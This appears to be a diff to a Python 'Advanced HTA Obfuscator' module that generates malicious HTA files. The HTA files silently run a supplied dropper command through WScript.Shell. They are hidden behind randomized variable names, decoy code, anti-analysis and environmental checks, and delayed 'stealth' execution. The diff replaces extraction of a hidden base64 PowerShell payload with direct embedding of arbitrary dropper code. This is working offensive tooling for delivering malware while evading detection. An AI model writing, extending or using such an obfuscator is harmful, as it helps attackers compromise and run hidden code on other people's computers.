@@ -4,14 +4,10 @@ Advanced HTA Obfuscator Module - DEFINITIVELY FIXED
 CRITICAL FIX: Variable naming collision completely resolved
 """
 
-import base64
 import random
 import string
-import re
-import math
 import hashlib
 import time
-import json
 
 class AdvancedHTAObfuscator:
     def __init__(self, obfuscation_level=1):
@@ -160,10 +156,6 @@ body {{ font-family: Arial; margin: 20px; }}
     def _obfuscate_sensitive_strings(self):
         sensitive_strings = {
             'wscript_shell': 'WScript.Shell',
-            'powershell_exe': 'powershell.exe',
-            'window_style': '-WindowStyle',
-            'hidden': 'hidden',
-            'encoded_flag': '-e',
             'self_ref': 'self',
             'close_method': 'close'
         }
@@ -229,29 +221,25 @@ try {{
 }} catch(e) {{}}
 '''
     
-    def _create_advanced_execution(self, var_mappings, shell_var, b64_var, cmd_var, result_var):
+    def _create_advanced_execution(self, var_mappings, shell_var, cmd_var, result_var):
         if self.obfuscation_level <= 7:
             activex_creation = f"var {shell_var}=new ActiveXObject({var_mappings['wscript_shell']});"
-            cmd_construction = f"var {cmd_var}={var_mappings['powershell_exe']}+' '+{var_mappings['window_style']}+' '+{var_mappings['hidden']}+' '+{var_mappings['encoded_flag']}+' '+{b64_var};"
             execution = f"var {result_var}={shell_var}.Run({cmd_var},0,false);"
-            return f"{activex_creation}\n{cmd_construction}\n{execution}"
+            return f"{activex_creation}\n{execution}"
         else:
             constructor_var = self._generate_guaranteed_unique_var()
             check_var = self._generate_guaranteed_unique_var()
             anti_analysis = f"var {check_var}=typeof(ActiveXObject)!=='undefined';"
             activex_creation = f"var {constructor_var}=ActiveXObject;var {shell_var}=new {constructor_var}({var_mappings['wscript_shell']});"
-            cmd_construction = f"var {cmd_var}={var_mappings['powershell_exe']}+' '+{var_mappings['window_style']}+' '+{var_mappings['hidden']}+' '+{var_mappings['encoded_flag']}+' '+{b64_var};"
             execution = f"if({check_var}){{var {result_var}={shell_var}.Run({cmd_var},0,false);}}"
-            return f"{anti_analysis}\n{activex_creation}\n{cmd_construction}\n{execution}"
-    
-    def _create_stealth_execution(self, var_mappings, b64_var):
+            return f"{anti_analysis}\n{activex_creation}\n{execution}"
+
+    def _create_stealth_execution(self, var_mappings, cmd_var):
         shell_var = self._generate_guaranteed_unique_var()
-        cmd_var = self._generate_guaranteed_unique_var()
         result_var = self._generate_guaranteed_unique_var()
         return f'''
 setTimeout(function() {{
     try {{
-        var {cmd_var} = {var_mappings['powershell_exe']} + ' ' + {var_mappings['window_style']} + ' ' + {var_mappings['hidden']} + ' ' + {var_mappings['encoded_flag']} + ' ' + {b64_var};
         var {shell_var} = new ActiveXObject({var_mappings['wscript_shell']});
         var {result_var} = {shell_var}.Run({cmd_var}, 0, false);
         setTimeout(function() {{
@@ -295,68 +283,34 @@ try {{
 }} catch(e) {{}}
 '''
     
-    def _encode_base64_with_obfuscation(self, b64_payload):
-        if self.obfuscation_level <= 7:
-            return f'"{b64_payload}"'
-        elif self.obfuscation_level <= 9:
-            mid_point = len(b64_payload) // 2
-            part1 = b64_payload[:mid_point]
-            part2 = b64_payload[mid_point:]
-            return f'"{part1}"+"{part2}"'
-        else:
-            chunk_size = len(b64_payload) // 3
-            chunks = [
-                b64_payload[:chunk_size],
-                b64_payload[chunk_size:chunk_size*2], 
-                b64_payload[chunk_size*2:]
-            ]
-            chunk_vars = []
-            var_declarations = []
-            for i, chunk in enumerate(chunks):
-                var_name = self._generate_guaranteed_unique_var()
-                chunk_vars.append(var_name)
-                var_declarations.append(f'var {var_name}="{chunk}";')
-            combined_declaration = '\n'.join(var_declarations)
-            final_combination = '+'.join(chunk_vars)
-            combined_var = self._generate_guaranteed_unique_var()
-            return combined_declaration + f'\nvar {combined_var}={final_combination};', combined_var
-    
-    def _extract_base64_from_oneliner(self, oneliner):
-        pattern = r'powershell\.exe\s+.*?-e\s+([A-Za-z0-9+/=]+)'
-        match = re.search(pattern, oneliner)
-        if match:
-            return match.group(1)
-        else:
-            parts = oneliner.split('-e ')
-            if len(parts) > 1:
-                return parts[1].strip()
-            raise ValueError("Could not extract Base64 payload from oneliner")
-    
-    def generate_obfuscated_hta_from_oneliner(self, oneliner):
+    def _build_js_command(self, command):
+        """Escapes the full powershell command for embedding as a JS double-quoted string."""
+        js_escaped = (command
+                      .replace('\\', '\\\\')
+                      .replace('"', '\\"')
+                      .replace('\r', '\\r')
+                      .replace('\n', '\\n'))
+        return js_escaped
+
+    def generate_obfuscated_hta(self, dropper_code):
         try:
             self.var_counter = random.randint(1000, 9999)
-            b64_payload = self._extract_base64_from_oneliner(oneliner)
+            js_command = self._build_js_command(dropper_code)
             obfuscated_vars, string_reconstructions, var_mappings = self._obfuscate_sensitive_strings()
             shell_var = self._generate_guaranteed_unique_var("shell")
-            b64_var = self._generate_guaranteed_unique_var("payload")
             cmd_var = self._generate_guaranteed_unique_var("cmd")
             result_var = self._generate_guaranteed_unique_var("result")
-            b64_encoded = self._encode_base64_with_obfuscation(b64_payload)
-            if isinstance(b64_encoded, tuple):
-                b64_declaration, b64_reference = b64_encoded
-                b64_setup = f"{b64_declaration}\nvar {b64_var}={b64_reference};"
-            else:
-                b64_setup = f"var {b64_var}={b64_encoded};"
+            cmd_setup = f'var {cmd_var}="{js_command}";'
             decoy_code = self._generate_decoy_code()
             body_content = self._create_body_content()
             close_obfuscation = self._create_close_obfuscation(var_mappings)
-            all_obfuscated_vars = '\n'.join(obfuscated_vars) 
+            all_obfuscated_vars = '\n'.join(obfuscated_vars)
             all_string_reconstructions = '\n'.join(string_reconstructions)
             if self.obfuscation_level >= 8:
                 environmental_checks = self._generate_environmental_checks()
-                stealth_execution = self._create_stealth_execution(var_mappings, b64_var)
+                stealth_execution = self._create_stealth_execution(var_mappings, cmd_var)
                 interaction_handler = self._generate_interaction_handler()
-                final_execution = f"{b64_setup}\n{stealth_execution}"
+                final_execution = f"{cmd_setup}\n{stealth_execution}"
                 hta_content = self.base_template.format(
                     environmental_checks=environmental_checks,
                     obfuscated_vars=all_obfuscated_vars,
@@ -368,8 +322,8 @@ try {{
                     close_obfuscation=close_obfuscation
                 )
             else:
-                main_execution = self._create_advanced_execution(var_mappings, shell_var, b64_var, cmd_var, result_var)
-                final_execution = f"{b64_setup}\n{main_execution}"
+                main_execution = self._create_advanced_execution(var_mappings, shell_var, cmd_var, result_var)
+                final_execution = f"{cmd_setup}\n{main_execution}"
                 hta_content = self.base_template.format(
                     obfuscated_vars=all_obfuscated_vars,
                     string_reconstructions=all_string_reconstructions,
